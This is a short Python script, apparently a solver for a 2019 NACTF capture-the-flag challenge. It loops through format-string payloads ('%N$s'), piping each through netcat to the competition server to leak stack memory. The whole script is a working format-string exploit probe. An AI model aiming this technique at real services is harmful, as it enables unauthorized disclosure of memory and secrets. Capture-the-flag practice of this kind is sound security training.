import os

for i in range(1, 200):
    cmd = 'python -c "print(\'%' + str(i) + '\$s\')" | nc shell.2019.nactf.com 31782'
    os.system(cmd)
    # print cmd
